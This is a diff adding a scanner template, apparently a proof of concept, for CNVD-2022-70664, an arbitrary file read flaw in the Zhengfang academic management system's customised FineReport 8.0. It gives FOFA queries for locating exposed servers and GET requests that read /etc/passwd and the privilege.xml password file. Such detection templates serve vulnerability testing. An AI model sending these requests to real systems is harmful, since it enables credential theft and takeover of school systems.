@@ -1,0 +1,32 @@
+id: CNVD-2022-70664
+
+info:
+  name: 正方软件教务管理系统任意文件读取漏洞
+  author: jammny
+  severity: high
+  description: |
+    正方软件教学管理信息服务平台存在任意文件读取漏洞, 帆软报表（正方定制版）8.0 存在任意文件读取漏洞，可读取密码配置文件，获取后台权限。从后台可获取明文数据库口令。
+    影响版本：<=8.0
+    FOFA: body="正方软件股份有限公司" && title="教学管理信息服务平台" 
+    FOFA: icon_hash="-2082130213" 
+    FOFA: body="jwglxt/xtgl/login_slogin.html" 
+    FOFA: body="xtgl/login_slogin.html"
+  reference:
+    -
+
+rules:
+  r0:
+    request:
+      method: GET
+      path:
+      - /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true
+      - /ReportServer?op=resource&resource=/etc/passwd&i18n=true
+    expression: response.status_code == 200 and response.text.__contains__('root')
+
+  r1:
+    request:
+      method: GET
+      path:
+      - /WebReport/ReportServer?op=resource&resource=privilege.xml&i18n=true
+      - /ReportServer?op=resource&resource=privilege.xml&i18n=true
+    expression: response.status_code == 200 and response.text.__contains__('___002f')
